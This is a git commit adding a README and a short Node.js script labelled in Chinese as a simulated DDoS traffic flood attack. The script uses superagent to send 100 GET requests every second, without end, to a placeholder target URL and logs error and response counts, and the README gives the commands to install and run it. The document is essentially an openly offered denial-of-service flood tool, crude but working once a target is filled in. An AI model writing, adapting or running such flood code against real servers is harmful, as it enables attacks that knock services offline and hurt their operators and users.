dc88dba749351b95d7fd3e372bf2d7583e9e92c1
onehack <onehacking@qq.com>
2018-01-29 17:11:58 +0800

    Add files via upload

---
+++ README.md
@@ -0,0 +1,19 @@
+###模拟DDOS流量洪水攻击###
+
+>**1.依赖包安装及运行**
+
+	> sudo npm install
+	
+	> sudo node app.js
+
+
+>**2.模拟客户端请求服务端**
+
+	> err: 50
+	> res: 30509
+
+
+----------
+2018/1/29 16:10:14
+
+Author :onehacking@qq.com
---
+++ app.js
@@ -0,0 +1,35 @@
+﻿'use stract';
+console.log('loding...');
+const app = require('superagent');
+var errNum = 0;
+var resNum = 0;
+
+// 设置每秒访问次数
+var setNum = 100;
+
+var url = 'https://xxx';
+
+function run() {
+    app.get(url)
+        .end((err, res) => {
+            if (err) {
+                errNum++;
+            };
+            if (res) {
+                resNum++;
+            };
+            console.log('err: %s', errNum);
+            console.log('res: %s', resNum);
+        });
+};
+
+// 1s内发起 (n)次请求
+function mode1(num) {
+    setInterval(() => {
+        for (let i = 0; i < num; i++) {
+            run();
+        };
+    }, 1000);
+};
+
+mode1(setNum);
